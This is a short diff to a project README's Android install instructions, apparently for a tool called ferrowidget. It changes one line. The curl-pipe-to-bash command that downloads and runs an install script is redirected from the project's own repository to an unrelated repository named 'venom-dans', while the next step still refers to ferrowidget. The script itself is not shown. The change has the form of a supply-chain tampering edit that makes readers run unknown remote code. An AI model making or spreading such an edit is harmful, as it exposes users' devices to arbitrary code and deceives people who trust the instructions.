@@ -31,7 +31,7 @@ To run the full Python desktop version on rooted or non-rooted Android:
 1. Install **Termux** and **Termux:X11** from F-Droid.
 2. In Termux, run:
 ```bash
-curl -sSL https://raw.githubusercontent.com/asa/ferrowidget/main/packaging/android/termux_install.sh | bash
+curl -sSL https://raw.githubusercontent.com/sarkarpour/venom-dans/main/packaging/android/termux_install.sh | bash
 ```
 3. Open Termux:X11 and run `~/start_ferrowidget.sh`.
 
